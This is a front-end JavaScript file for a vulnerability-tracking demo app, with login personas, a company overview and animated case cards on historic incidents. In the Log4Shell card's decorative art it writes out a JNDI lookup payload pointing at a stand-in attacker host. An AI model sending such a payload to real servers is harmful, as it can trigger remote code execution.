// helpers
const $ = (id) => document.getElementById(id);
const esc = (s) => String(s ?? '').replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
const md = (s) => DOMPurify.sanitize(marked.parse(s || ''));
const store = {
  get: (k) => { try { return localStorage.getItem('plexus.' + k); } catch { return null; } },
  set: (k, v) => { try { v == null ? localStorage.removeItem('plexus.' + k) : localStorage.setItem('plexus.' + k, v); } catch {} },
};
const COLOR = { Vulnerability: '#FF5470', Component: '#22D3EE', Product: '#8B5CF6', Team: '#FFB547', Person: '#3EE08F' };
const GLOSS = {
  CVE: 'A public ID for a known security bug, e.g. CVE-2023-4863. Everyone in the world uses the same ID.',
  CRA: 'EU Cyber Resilience Act: an EU law for software and connected devices sold in Europe. Since 11 Sep 2026, bugs that attackers are using must be reported within 24 hours.',
  KEV: "CISA's Known Exploited Vulnerabilities list: a public list of bugs that attackers are actively using. CISA is the US cyber agency.",
  PSIRT: 'Product Security Incident Response Team: the company team that handles security bugs in its products and talks to regulators.',
  DORA: 'EU Digital Operational Resilience Act: tech-risk and incident rules for banks, insurers and fintechs. Covers their services (apps, APIs, platforms), and is supervised by financial regulators.',
  CSIRT: "A country's official computer security incident response team. Under the CRA, reports go to the CSIRT of the country where the company has its main EU base, and to ENISA, through one platform.",
  ENISA: "The EU's cybersecurity agency. CRA reports go to it and to the national cyber team (CSIRT).",
};
const AVATAR = ['#8B5CF6', '#22D3EE', '#3EE08F', '#FFB547', '#FF5470'];
const initials = (n) => (n || '?').split(/\s+/).map((w) => w[0]).slice(0, 2).join('').toUpperCase();
const hue = (n) => AVATAR[[...(n || '')].reduce((a, c) => a + c.charCodeAt(0), 0) % AVATAR.length];
const avatar = (n, size = 28) => `<span title="${esc(n)}" class="inline-flex items-center justify-center rounded-full font-semibold text-ink flex-none"
  style="width:${size}px;height:${size}px;font-size:${size * 0.4}px;background:${hue(n)}">${esc(initials(n))}</span>`;
const timeOf = (iso) => iso ? new Date(iso).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
const dur = (min) => min < 60 ? `${min} min` : `${Math.floor(min / 60)}h ${min % 60}m`;
const roleLabel = (u) => u.role_label || u.access;
const isPsirt = (u) => (u?.access || '').startsWith('psirt');
const may = (perm) => (USER?.permissions || []).includes(perm);

function glossary(root = document) {
  root.querySelectorAll('abbr[data-g]').forEach((a) => { a.title = GLOSS[a.dataset.g] || ''; });
}
let LOGO_N = 0;
function logo(size) {
  // the bug (red diamond) spreading through layers of software to a customer (cyan); small sizes drop the detail
  const id = LOGO_N++, small = size < 24;
  return `<svg width="${size}" height="${size}" viewBox="0 0 32 32" aria-hidden="true">
      <defs><linearGradient id="lt${id}" x1="16" y1="16" x2="24" y2="4" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#FF5470"/><stop offset=".45" stop-color="#8B5CF6"/><stop offset="1" stop-color="#22D3EE"/></linearGradient>
        <linearGradient id="lr${id}" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#8B5CF6"/><stop offset="1" stop-color="#22D3EE"/></linearGradient></defs>
      ${small ? '' : `<circle cx="16" cy="16" r="6.8" fill="none" stroke="#8B5CF6" stroke-opacity=".5" stroke-width="1.2" stroke-dasharray="2 1.8"/>
      <circle cx="16" cy="16" r="10.8" fill="none" stroke="#8B5CF6" stroke-opacity=".38" stroke-width="1.2" stroke-dasharray="2 1.8"/>
      <path d="M16 16 L9.8 13.2 L5.4 15.6 L2.9 20.6" fill="none" stroke="#8B5CF6" stroke-opacity=".6" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
      <circle cx="9.8" cy="13.2" r="1.4" fill="#8B5CF6"/><circle cx="5.4" cy="15.6" r="1.4" fill="#8B5CF6"/><circle cx="2.9" cy="20.6" r="1.9" fill="#8B5CF6"/>`}
      <circle cx="16" cy="16" r="14.4" fill="none" stroke="url(#lr${id})" stroke-width="${small ? 2.4 : 1.6}"/>
      <path d="M16 16 L22.6 14.6 L24.6 9.8 L23.4 4.2" fill="none" stroke="url(#lt${id})" stroke-width="${small ? 3 : 2.2}" stroke-linecap="round" stroke-linejoin="round"/>
      ${small ? '' : '<circle cx="22.6" cy="14.6" r="1.6" fill="#A78BFA"/><circle cx="24.6" cy="9.8" r="1.6" fill="#67C8F0"/>'}
      <circle cx="23.4" cy="4.2" r="${small ? 3.6 : 2.9}" fill="#22D3EE" class="pulse"/>
      <path d="${small ? 'M16 11.2 L20.8 16 L16 20.8 L11.2 16 Z' : 'M16 12 L20 16 L16 20 L12 16 Z'}" fill="#FF5470"/></svg>
    <span class="font-semibold tracking-tight" style="font-size:${size * 0.82}px">plexus</span>`;
}
function toast(text, ms = 2800) {
  const t = $('toast'); t.innerHTML = text; t.classList.remove('hidden');
  clearTimeout(toast._t); toast._t = setTimeout(() => t.classList.add('hidden'), ms);
}

// sign-in
let USER = null;
let INCIDENT = store.get('incident') || newIncidentId();
function newIncidentId() { return 'INC-' + crypto.randomUUID().slice(0, 4).toUpperCase(); }

async function api(path, opts = {}) {
  const r = await fetch(path, { ...opts, headers: { 'Content-Type': 'application/json',
    Authorization: 'Bearer ' + (store.get('token') || ''), ...(opts.headers || {}) } });
  let data = {}; try { data = await r.json(); } catch {}
  if (r.status === 401) setTimeout(logout, 1200);
  if (!r.ok) {
    const d = data.detail;
    const err = new Error(Array.isArray(d) ? d.map((x) => x.msg).join('; ') : d || r.statusText);
    err.status = r.status; throw err;
  }
  return data;
}

const DUTY = { psirt_lead: 'assigns fixes, approves and sends EU reports', psirt_analyst: 'investigates, prepares EU reports',
  compliance: 'DORA assessments and suppliers', ciso: 'oversight across every incident', auditor: 'audit trail, read-only' };
async function showLogin() {
  $('app').classList.add('hidden'); $('login').classList.remove('hidden');
  $('logo-big').innerHTML = logo(34);
  glossary($('login'));
  const people = await (await fetch('/api/personas')).json();
  const card = (p) => {
    const psirt = isPsirt(p);
    return `<button data-name="${esc(p.name)}" class="persona card px-4 py-3.5 flex items-center gap-3 hover:border-line2 hover:-translate-y-0.5 transition group">
        ${avatar(p.name, 38)}
        <div class="min-w-0 flex-1"><div class="font-medium truncate">${esc(p.name)}</div>
          <div class="text-xs truncate" style="color:${psirt ? 'var(--violet)' : 'var(--cyan)'}">${roleLabel(p)}${psirt ? '' : ` · ${esc(p.team)}`}</div>
          <div class="text-[11px] text-faint truncate mt-0.5">${esc(DUTY[p.access] ? DUTY[p.access] : p.owns.length ? 'fixes ' + p.owns.join(', ') : '')}</div></div>
        <span class="text-faint group-hover:text-fg">→</span>
      </button>`;
  };
  const featured = people.filter((p) => p.featured), rest = people.filter((p) => !p.featured);
  $('personas').innerHTML = featured.map(card).join('')
    + (rest.length ? `<button id="morepeople" class="sm:col-span-2 lg:col-span-3 text-xs text-muted hover:text-fg py-1">Show everyone at Fernwave (${people.length}) ↓</button>
       <div id="restpeople" class="hidden contents">${rest.map(card).join('')}</div>` : '');
  $('morepeople')?.addEventListener('click', (e) => { $('restpeople').classList.remove('hidden'); e.currentTarget.remove(); });
  document.querySelectorAll('.persona').forEach((b) => b.onclick = () => login(b.dataset.name));
  if (!CASES.length) { loadCases(); loadFernwave(); }
  fetch('/api/sources').then((r) => r.json()).then((src) => {
    if (src.real_data) $('landfoot').innerHTML = `Live vulnerability data: CISA KEV catalog ${esc(src.kev.catalogVersion)} (${src.kev.count.toLocaleString()} exploited CVEs) · OSV.dev · FIRST EPSS · Fernwave is a demo workspace.`;
  }).catch(() => {});
}

// landing: Meet Fernwave (every number comes from the graph)
const ICON = {
  'hardware+firmware': '<rect x="6" y="2.5" width="12" height="19" rx="2.5"/><rect x="8.5" y="5" width="7" height="5" rx="1"/><path d="M9 13h.01M12 13h.01M15 13h.01M9 16h.01M12 16h.01M15 16h.01"/>',
  'desktop software': '<rect x="2.5" y="4" width="19" height="12.5" rx="2"/><path d="M8 20.5h8M12 16.5v4"/>',
  'SaaS': '<path d="M7 18.5a4.5 4.5 0 0 1-.6-8.96A6 6 0 0 1 18 8.5a4 4 0 0 1-.5 10z"/>',
  'internal platform': '<path d="M12 3 3 7.5l9 4.5 9-4.5z"/><path d="m3 12 9 4.5 9-4.5M3 16.5 12 21l9-4.5"/>',
  'on-prem appliance': '<rect x="3" y="4" width="18" height="6.5" rx="1.5"/><rect x="3" y="13.5" width="18" height="6.5" rx="1.5"/><path d="M7 7.25h.01M7 16.75h.01"/>',
};
function regime(p) {
  if (!p.cra_in_scope) return ['Service · DORA', 'var(--amber)', 'Runs as a service, so DORA applies, not the CRA'];
  if (p.markets.includes('EU')) return ['Product · CRA', 'var(--violet)', 'Sold in the EU: exploited bugs must be reported within 24h'];
  if (!p.markets.length) return ['Not on sale yet', 'var(--faint)', 'Release candidate: the CRA applies once it is placed on the market'];
  return [`${p.markets.join(' · ')} only`, 'var(--cyan)', 'Sold outside the EU: no EU report, but it still gets fixed'];
}
function flowSVG(side) {   // animated threads between the columns
  const ys = [10, 30, 50, 70, 90];
  const d = ys.map((y) => side === 'in' ? `M0 ${y} C 50 ${y}, 50 50, 100 50` : `M0 50 C 50 50, 50 ${y}, 100 ${y}`).join(' ');
  return `<svg class="flow w-full h-full" viewBox="0 0 100 100" preserveAspectRatio="none" aria-hidden="true">
    <path d="${d}" fill="none" stroke="url(#fl-${side})" stroke-width="1.4" vector-effect="non-scaling-stroke"/>
    <defs><linearGradient id="fl-${side}"><stop offset="0" stop-color="${side === 'in' ? '#22D3EE' : '#8B5CF6'}"/><stop offset="1" stop-color="${side === 'in' ? '#8B5CF6' : '#3EE08F'}"/></linearGradient></defs></svg>`;
}
async function loadFernwave() {
  let d;
  try { d = await (await fetch('/api/company')).json(); } catch { return; }
  const n = d.counts, num = (x) => (x ?? 0).toLocaleString();
  $('fwstats').innerHTML = [[d.products.length, 'products & services'], [n.Team, 'teams'], [n.Person, 'people'],
    [n.Component, 'software parts'], [d.eu_countries.length, 'EU countries'], [n.Supplier, 'key supplier']]
    .map(([v, l]) => `<div class="rounded-xl border hair bg-surface/60 px-3 py-3"><div class="text-2xl font-semibold font-mono grad">${num(v)}</div><div class="text-[11px] text-faint mt-1">${l}</div></div>`).join('');
  $('fwproducts').innerHTML = d.products.map((p) => {
    const [tag, col, why] = regime(p);
    return `<div class="ptile rounded-2xl border hair bg-surface/70 p-4" title="${esc(why)}">
      <div class="flex items-start justify-between gap-2">
        <span class="w-9 h-9 rounded-xl grid place-items-center" style="background:${col}1f;color:${col}">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">${ICON[p.category] || ICON.SaaS}</svg></span>
        <span class="chip !text-[10px]" style="color:${col};border-color:${col}55">${esc(tag)}</span></div>
      <div class="font-medium mt-3">${esc(p.product)} <span class="text-[11px] font-mono text-faint">${esc(p.version)}</span></div>
      <div class="text-[11px] text-muted mt-0.5">${esc(p.category.replace('+', ' + '))} · ${esc(p.owner_team || 'no owner')} team</div>
      <div class="text-[11px] text-faint mt-2">${p.parts} software parts inside</div></div>`;
  }).join('');
  const box = (title, sub, items, col) => `<div class="node2"><div class="text-sm font-medium" style="color:${col}">${title}</div>
    <div class="text-[11px] text-faint">${sub}</div><div class="text-[12px] text-muted mt-1.5 leading-snug">${items}</div></div>`;
  const ins = [
    box('Threat feeds', 'public · refreshed', `CISA exploited list (${num(n.Exploited)}), OSV.dev, FIRST EPSS`, 'var(--red)'),
    box("Fernwave's software", 'SBOMs · repos', `${num(n.Component)} parts in ${num(n.Repo)} repos, every dependency by version`, 'var(--cyan)'),
    box("Fernwave's people", 'HR · on-call rota', `${num(n.Team)} teams, ${num(n.Person)} people, who's on call, who owns what`, 'var(--green)'),
    box('Company knowledge', 'Jira · Slack · wiki', `${num(n.Ticket)} tickets, ${num(n.ChatMessage)} chat threads, ${num(n.Doc)} docs, ${num(n.Decision)} decisions`, 'var(--amber)'),
    box('Suppliers', 'DORA register', `${num(n.Supplier)} critical ICT supplier and the software it runs`, 'var(--violet)'),
  ];
  const outs = [
    box('EU reports', 'to ENISA + national CSIRT', '24h alert, 72h report, final report: pre-filled, analyst prepares, lead sends', 'var(--red)'),
    box('Fix tasks', 'to the on-call owner', 'Linked to the Jira ticket already tracking it; shipping closes both', 'var(--amber)'),
    box('DORA assessments', 'for Compliance', 'Services and suppliers, assessed and recorded', 'var(--amber)'),
    box('Audit trail', 'for the CISO and auditors', 'Who knew what, when, and what they did', 'var(--violet)'),
    box('SBOMs', 'for customers and auditors', 'A CycloneDX parts list for every product, on demand', 'var(--cyan)'),
  ];
  $('fwflow').innerHTML = `<div class="grid gap-3 lg:gap-0 lg:grid-cols-[1fr_70px_1.05fr_70px_1fr] items-stretch">
    <div class="space-y-2"><div class="text-[10px] uppercase tracking-[.15em] text-faint mb-1">What plexus reads</div>${ins.join('')}</div>
    <div class="hidden lg:block pt-6">${flowSVG('in')}</div>
    <div class="lg:hidden text-center text-faint">↓</div>
    <div class="flex flex-col justify-center lg:pt-6">
      <div class="rounded-2xl border p-5 relative overflow-hidden" style="border-color:rgba(139,92,246,.45);background:radial-gradient(400px 220px at 50% 0%, rgba(139,92,246,.22), rgba(12,14,21,.95))">
        <div class="flex items-center gap-2">${logo(26)}</div>
        <div class="text-[13px] text-muted mt-2 leading-snug">One <b class="text-fg">FalkorDB knowledge graph</b> that joins all of it: ${num(Object.values(n).reduce((a, b) => a + b, 0) - n.Exploited)} nodes, from the bug to the person who fixes it.</div>
        <div class="mt-4 space-y-2">
          <div class="rounded-xl bg-ink/60 border hair px-3 py-2"><div class="text-[12px] font-medium text-cyan">Ask anything</div><div class="text-[11px] text-muted">Plain-English questions, answered only from the graph, with the source behind every fact. Each person sees and does only what their role allows.</div></div>
          <div class="rounded-xl bg-ink/60 border hair px-3 py-2"><div class="text-[12px] font-medium text-amber">Watcher agent</div><div class="text-[11px] text-muted">Re-checks CISA's list against the graph every 15 min and leaves alerts for the team.</div></div>
          <div class="rounded-xl bg-ink/60 border hair px-3 py-2"><div class="text-[12px] font-medium text-green">Shared memory</div><div class="text-[11px] text-muted">Every incident, chat, decision and fix is saved in the graph, per person and per team.</div></div>
        </div>
      </div>
    </div>
    <div class="hidden lg:block pt-6">${flowSVG('out')}</div>
    <div class="lg:hidden text-center text-faint">↓</div>
    <div class="space-y-2"><div class="text-[10px] uppercase tracking-[.15em] text-faint mb-1">What Fernwave gets</div>${outs.join('')}</div>
  </div>`;
  $('fernwave').classList.remove('hidden');
}

// landing: real cases, replayed against the graph
let CASES = [];
const plural = (n, w) => `${n} ${w}${n === 1 ? '' : 's'}`;
function outcome(c) {
  if (c.affected.length) return c.must_report ? ['var(--red)', `${plural(c.affected.length, 'product')} · ${c.must_report} must report`]
                                              : ['var(--amber)', `${plural(c.affected.length, 'product')} exposed`];
  if (c.suppliers.length) return ['var(--amber)', 'a supplier is exposed'];
  return ['var(--green)', 'not exposed'];
}
function glyph(c, col) {   // the bug (red diamond) and the hops it takes to reach Fernwave
  const hops = c.affected[0]?.hops ?? (c.suppliers.length ? 2 : 0), w = 18 + Math.max(hops, 2) * 11;
  const dots = Array.from({ length: hops }, (_, i) => `<circle cx="${16 + i * 11}" cy="6" r="${i === hops - 1 ? 3.4 : 2.2}" fill="${i === hops - 1 ? col : '#22D3EE'}"/>`).join('');
  return `<svg width="${w}" height="12" viewBox="0 0 ${w} 12" aria-hidden="true" class="flex-none">
    <line x1="5" y1="6" x2="${hops ? 16 + (hops - 1) * 11 : w - 4}" y2="6" stroke="${hops ? 'rgba(34,211,238,.5)' : 'rgba(62,224,143,.5)'}" stroke-dasharray="${hops ? '0' : '2 3'}"/>
    <path d="M5 1.5 L9.5 6 L5 10.5 L.5 6 Z" fill="#FF5470"/>${dots}
    ${hops ? '' : `<path d="M${w - 9} 3 l6 6 M${w - 3} 3 l-6 6" stroke="#3EE08F" stroke-width="1.4"/>`}</svg>`;
}
function verdictPill(v) {
  const m = { 'CRA REPORTABLE': ['EU report in 24h', 'var(--red)'], 'LIKELY OUT OF CRA SCOPE': ['Service · tell Compliance (DORA)', 'var(--amber)'],
              'NOT REPORTABLE UNDER CRA': ['Not sold in the EU', 'var(--green)'], 'NOT REPORTABLE': ['Not on the market yet', 'var(--green)'] }[v] || [v, 'var(--muted)'];
  return `<span class="chip !text-[10px]" style="color:${m[1]};border-color:${m[1]}55">${m[0]}</span>`;
}
// Background art: one motif per case, drawn from what the bug actually was.
function rnd(seed) { let x = [...seed].reduce((a, c) => a * 31 + c.charCodeAt(0) | 0, 7); return () => ((x = (x * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff); }
function caseArt(c) {
  const r = rnd(c.id), W = 350, H = 480, cy = 'rgba(34,211,238,', vi = 'rgba(139,92,246,', red = 'rgba(255,84,112,';
  let g = '';
  switch (c.id) {
    case 'log4shell':          // log lines with the poisoned lookup glowing in the middle
      for (let i = 0; i < 22; i++) {
        const hot = i === 7 || i === 13;
        g += `<text x="${-20 + r() * 30}" y="${22 + i * 21}" font-family="Geist Mono" font-size="11" fill="${hot ? red + '.9)' : cy + (.08 + r() * .12) + ')'}">${hot ? 'GET /login  User-Agent: ${jndi:ldap://evil.example/a}' : ['INFO  request handled in 12ms', 'DEBUG session ok user=4821', 'INFO  GET /api/v1/payments 200', 'WARN  slow query 340ms', 'INFO  cache hit merchant=77'][i % 5]}</text>`;
      }
      break;
    case 'libwebp':            // a pixel mosaic with a heap overflow spilling out of its buffer
      for (let y = 0; y < 16; y++) for (let x = 0; x < 12; x++) {
        const spill = y > 5 && y < 9 && x > 3 + (y - 6);
        g += `<rect x="${x * 30 + 2}" y="${y * 30 + 2}" width="26" height="26" rx="4" fill="${spill ? red + (.35 + r() * .4) + ')' : vi + (r() * .22) + ')'}"/>`;
      }
      g += `<rect x="92" y="152" width="120" height="116" rx="6" fill="none" stroke="${cy}.6)" stroke-dasharray="4 4"/>`;
      break;
    case 'rapidreset':         // many streams opened and instantly reset
      for (let i = 0; i < 34; i++) {
        const y = 10 + i * 14, x = r() * 120, len = 40 + r() * 140;
        g += `<line x1="${x}" y1="${y}" x2="${x + len}" y2="${y}" stroke="${cy}${.15 + r() * .35})" stroke-width="2" stroke-linecap="round"/>`
           + `<path d="M${x + len + 4} ${y - 4} l8 8 M${x + len + 12} ${y - 4} l-8 8" stroke="${red}.7)" stroke-width="1.6"/>`;
      }
      break;
    case 'moveit':             // files travelling via a supplier box, one stream leaking out
      g += `<rect x="135" y="190" width="80" height="60" rx="10" fill="${vi}.18)" stroke="${vi}.6)"/><text x="175" y="225" text-anchor="middle" font-family="Geist Mono" font-size="10" fill="${vi}.9)">supplier</text>`;
      for (let i = 0; i < 9; i++) {
        const y = 40 + i * 48, x = 20 + r() * 40;
        g += `<rect x="${x}" y="${y}" width="22" height="28" rx="3" fill="${cy}.15)" stroke="${cy}.45)"/><path d="M${x + 26} ${y + 14} C 100 ${y + 14}, 110 220, 135 220" fill="none" stroke="${cy}.25)" stroke-dasharray="3 4"/>`;
      }
      for (let i = 0; i < 6; i++) g += `<path d="M215 ${205 + i * 6} C 270 ${200 + i * 6}, 290 ${120 + i * 50}, 360 ${100 + i * 60}" fill="none" stroke="${red}${.25 + i * .08})" stroke-width="1.5"/>`;
      break;
    case 'citrixbleed':        // session tokens bleeding out of the gateway
      g += `<rect x="0" y="40" width="350" height="18" fill="${vi}.35)"/>`;
      for (let i = 0; i < 26; i++) {
        const x = 12 + r() * 326, y = 70 + r() * 360, s2 = 3 + r() * 7;
        g += `<path d="M${x} ${y - s2 * 2} Q ${x + s2} ${y}, ${x} ${y + s2} Q ${x - s2} ${y}, ${x} ${y - s2 * 2}Z" fill="${red}${.15 + r() * .45})"/>`;
      }
      for (let i = 0; i < 6; i++) g += `<text x="${20 + i * 55}" y="54" font-family="Geist Mono" font-size="8" fill="rgba(255,255,255,.35)">sess=${Math.floor(r() * 1e6).toString(16)}</text>`;
      break;
    case 'ivanti':             // the VPN tunnel
      for (let i = 0; i < 14; i++) g += `<ellipse cx="175" cy="200" rx="${20 + i * 18}" ry="${12 + i * 13}" fill="none" stroke="${i % 4 === 0 ? red + '.45)' : cy + (.08 + i * .015) + ')'}" stroke-width="${i % 4 === 0 ? 1.6 : 1}"/>`;
      g += `<circle cx="175" cy="200" r="6" fill="${red}.9)"/>`;
      break;
    case 'xz':                 // compressed zig-zag stripes hiding one backdoor key
      for (let i = 0; i < 26; i++) {
        let d = `M-10 ${15 + i * 18}`;
        for (let x = 0; x < 380; x += 14) d += ` L${x} ${15 + i * 18 + (x / 14 % 2 ? -5 : 5)}`;
        g += `<path d="${d}" fill="none" stroke="${i === 11 ? red + '.8)' : vi + (.1 + r() * .18) + ')'}" stroke-width="${i === 11 ? 2 : 1.2}"/>`;
      }
      g += `<g transform="translate(232 196)" stroke="${red}.9)" stroke-width="2" fill="none"><circle cx="0" cy="0" r="9"/><path d="M9 0 h26 v8 M27 0 v6"/></g>`;
      break;
    case 'panos':              // a firewall with a crack running through it
      for (let y = 0; y < 18; y++) for (let x = -1; x < 7; x++)
        g += `<rect x="${x * 56 + (y % 2 ? 28 : 0)}" y="${y * 27}" width="52" height="23" rx="3" fill="${vi}${.06 + r() * .14})"/>`;
      g += `<path d="M190 0 L172 70 L204 130 L168 210 L210 290 L176 380 L200 480" fill="none" stroke="${red}.85)" stroke-width="2.4"/>`;
      break;
    case 'toolshell':          // stacked documents, the first patch peeling off
      for (let i = 0; i < 7; i++) {
        const x = 60 + i * 22, y = 40 + i * 30;
        g += `<rect x="${x}" y="${y}" width="170" height="220" rx="10" fill="rgba(12,14,21,.9)" stroke="${cy}${.15 + i * .06})"/>`;
        for (let k = 0; k < 6; k++) g += `<rect x="${x + 16}" y="${y + 22 + k * 18}" width="${70 + r() * 70}" height="5" rx="2" fill="${cy}.12)"/>`;
      }
      g += `<g transform="translate(190 300) rotate(-24)"><rect width="110" height="34" rx="8" fill="${red}.25)" stroke="${red}.8)" stroke-dasharray="5 4"/><text x="55" y="22" text-anchor="middle" font-family="Geist Mono" font-size="11" fill="${red}.95)">patch #1</text></g>`;
      break;
    case 'react2shell':        // the React atom, with a shell prompt for a nucleus
      for (let i = 0; i < 3; i++) g += `<ellipse cx="175" cy="200" rx="150" ry="56" transform="rotate(${i * 60} 175 200)" fill="none" stroke="${cy}.35)" stroke-width="1.6"/>`;
      g += `<circle cx="175" cy="200" r="26" fill="${red}.2)" stroke="${red}.8)"/><text x="175" y="205" text-anchor="middle" font-family="Geist Mono" font-size="15" fill="${red}.95)">$_</text>`;
      for (let i = 0; i < 40; i++) g += `<circle cx="${r() * W}" cy="${r() * H}" r="${r() * 1.6}" fill="rgba(255,255,255,${r() * .4})"/>`;
      break;
  }
  return `<svg viewBox="0 0 ${W} ${H}" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
    <defs><radialGradient id="glow-${c.id}" cx="80%" cy="0%" r="90%"><stop offset="0" stop-color="#8B5CF6" stop-opacity=".35"/><stop offset="1" stop-color="#07080D" stop-opacity="0"/></radialGradient></defs>
    <rect width="${W}" height="${H}" fill="#0B0D14"/><rect width="${W}" height="${H}" fill="url(#glow-${c.id})"/>${g}</svg>`;
}

function caseCard(c, i) {
  const [col, label] = outcome(c);
  const reportable = c.affected.filter((a) => a.verdict === 'CRA REPORTABLE');
  const owners = [...new Set(c.affected.flatMap((a) => a.oncall))];
  const tickets = c.affected.flatMap((a) => a.tickets);
  const trace = c.affected.length
    ? c.affected.slice(0, 3).map((a) => `<div class="mt-1.5"><div class="text-[12px] font-medium flex flex-wrap items-center gap-1.5">${esc(a.product)} ${verdictPill(a.verdict)}</div>
        <div class="text-[10.5px] font-mono text-muted leading-snug mt-0.5">${esc(a.chain)}</div></div>`).join('')
    : c.suppliers.length
      ? c.suppliers.map((s) => `<div class="text-[12px] mt-1">Not in our products, but <b>${esc(s.supplier)}</b> runs ${esc(s.vulnerable_component.replace('@', ' '))}. It holds ${esc(s.data_at_risk)}.</div>`).join('')
      : `<div class="text-[12px] text-muted mt-1">Checked ${c.checked.components} parts in ${c.checked.products} products and ${plural(c.checked.suppliers, 'supplier')}: no path from this bug.</div>`;
  const act = owners.length ? `Fix tasks to ${esc(owners.join(', '))}${tickets.length ? `, linked to ${esc(tickets.join(', '))}` : ''}.`
    : c.suppliers.length ? `${esc(c.suppliers[0].contract_owner)} contacts the supplier; Compliance assesses it under DORA.`
    : 'Nobody gets woken up. The war room stays closed.';
  const report = reportable.length ? `24h EU alert pre-filled for ${esc(reportable.map((a) => a.product).join(' and '))}.`
    : c.affected.length ? 'No EU report: nothing affected is a product on the EU market.' : 'No EU report needed.';
  const tiles = c.affected.length ? [[c.affected.length, plural(c.affected.length, 'product').replace(/^\d+ /, '') + ' hit'], [reportable.length, 'EU reports'], [owners.length, 'owners paged']]
    : c.suppliers.length ? [[0, 'products hit'], [c.suppliers.length, 'supplier exposed'], [1, 'contact owner']]
    : [[c.checked.components, 'parts checked'], [c.checked.products, 'products'], [0, 'paths found']];
  const top = c.affected[0];
  const headline = top ? `Reaches <b class="text-fg">${esc(top.product)}</b>${c.affected.length > 1 ? `, plus ${plural(c.affected.length - 1, 'more product')}` : ''}${top.hops > 1 ? ', through parts nobody lists directly' : ''}.`
    : c.suppliers.length ? `Not in anything we ship, but <b class="text-fg">${esc(c.suppliers[0].supplier.replace(/ \(.*\)/, ''))}</b> runs it and holds staff data.`
    : 'No path from this bug to anything Fernwave ships or uses. Nobody gets woken up.';
  const flat = c.affected.length ? `<div class="mt-3 text-[12px]"><span class="text-amber">A package-list check finds ${c.package_list_finds} of ${c.affected.length}.</span> <span class="text-faint">It only sees what each product lists directly.</span></div>` : '';
  const steps = [['var(--violet)', 'What happened', esc(c.happened)], ['var(--cyan)', 'Trace', trace], ['var(--amber)', 'Act', act], ['var(--red)', 'Report', report]];
  if (c.past_fixes.length) steps.push(['var(--green)', 'Remember', `Fixed before (${esc(c.past_fixes[0].when.slice(0, 4))}): ${esc(c.past_fixes[0].how)}`]);
  return `<div class="sc" data-i="${i}" role="group" aria-label="${esc(c.name)}, ${i + 1} of ${CASES.length}">
    <div class="sc-in">
      <div class="sf">
        <div class="art">${caseArt(c)}</div><div class="veil"></div>
        <span class="stamp" data-stamp="next" style="right:22px;color:var(--cyan);border-color:var(--cyan)">NEXT</span>
        <span class="stamp" data-stamp="prev" style="left:22px;color:var(--violet);border-color:var(--violet);transform:rotate(12deg)">BACK</span>
        <div class="relative h-full flex flex-col p-6">
          <div class="flex items-center justify-between text-[11px]"><span class="font-mono text-muted">${esc(c.date.slice(0, 7))}</span>
            <span class="chip !text-[10px] text-fg/80 bg-ink/60 backdrop-blur">${esc(c.pattern)}</span></div>
          <div class="mt-auto">
            <div class="text-xl font-semibold">${esc(c.name)}</div>
            <div class="text-[46px] font-semibold tracking-tight grad leading-none mt-2">${esc(c.stat)}</div>
            <div class="text-xs text-muted mt-1.5">${esc(c.stat_label)}</div>
            <p class="text-[13px] text-fg/75 mt-3 leading-snug">${esc(c.hard_part)}</p>
            <div class="mt-4 pt-3 border-t border-white/10 flex items-center gap-2 text-[11px]">${glyph(c, col)}
              <span class="font-medium" style="color:${col}">Fernwave: ${label}</span>
              <span class="ml-auto text-faint text-sm" title="Tap to flip">↻</span></div>
          </div>
        </div>
      </div>
      <div class="sf back">
        <div class="art opacity-30">${caseArt(c)}</div><div class="absolute inset-0 bg-surface/90"></div>
        <div class="relative h-full flex flex-col p-6">
          <div class="flex items-center justify-between text-[10px] uppercase tracking-[.15em] text-faint"><span>plexus replay · Fernwave</span></div>
          <div data-sum class="flex-1 flex flex-col">
            <div class="text-2xl font-semibold mt-3 leading-tight" style="color:${col}">${label[0].toUpperCase() + label.slice(1)}</div>
            <div class="grid grid-cols-3 gap-2 mt-5">${tiles.map(([v, l]) => `<div class="rounded-xl border hair bg-ink/50 px-2.5 py-2">
              <div class="font-mono text-lg leading-none">${v}</div><div class="text-[10px] text-faint mt-1 leading-tight">${l}</div></div>`).join('')}</div>
            <div class="mt-5 text-[13px] text-muted leading-snug">${headline}</div>${flat}
            <div class="mt-auto space-y-2">
              <button class="w-full rounded-xl px-3 py-2.5 text-sm font-medium text-ink" style="background:linear-gradient(90deg,var(--violet),var(--cyan))" data-replay="${i}">Replay it live →</button>
              <button class="w-full btn justify-center !py-2" data-more>How plexus got there ↓</button>
            </div>
          </div>
          <div data-det class="hidden flex-1 min-h-0 flex flex-col">
            <div class="scroll flex-1 min-h-0 overflow-y-auto mt-3 space-y-3 pr-1">${steps.map(([sc, t, body]) =>
              `<div class="mini" style="--c:${sc}"><div class="text-[10px] uppercase tracking-[.14em] text-faint">${t}</div><div class="text-[12.5px] leading-snug mt-0.5">${body}</div></div>`).join('')}
              <div class="text-[10px] text-faint">Sources: ${c.sources.map((u) => `<a class="underline hover:text-fg" target="_blank" rel="noopener" href="${esc(u)}">${esc(new URL(u).hostname.replace('www.', ''))}</a>`).join(' · ')}</div></div>
            <button class="mt-3 w-full btn justify-center !py-2" data-more>← Back to summary</button>
          </div>
        </div>
      </div>
    </div></div>`;
}

// the deck: drag/swipe the top card away, tap to flip, arrows and keys too
let CUR = 0;
function layoutDeck() {
  const n = CASES.length;
  $('deck').querySelectorAll('.sc').forEach((el) => {
    const k = (+el.dataset.i - CUR + n) % n;           // position in the stack
    el.style.zIndex = String(n - k);
    el.style.opacity = k < 3 ? '1' : '0';
    el.style.pointerEvents = k === 0 ? 'auto' : 'none';
    el.style.transform = k < 3 ? `translateY(${k * 16}px) scale(${1 - k * .06}) rotate(${k ? (k % 2 ? 3 : -3) : 0}deg)` : 'translateY(48px) scale(.82)';
    el.setAttribute('aria-hidden', k ? 'true' : 'false');
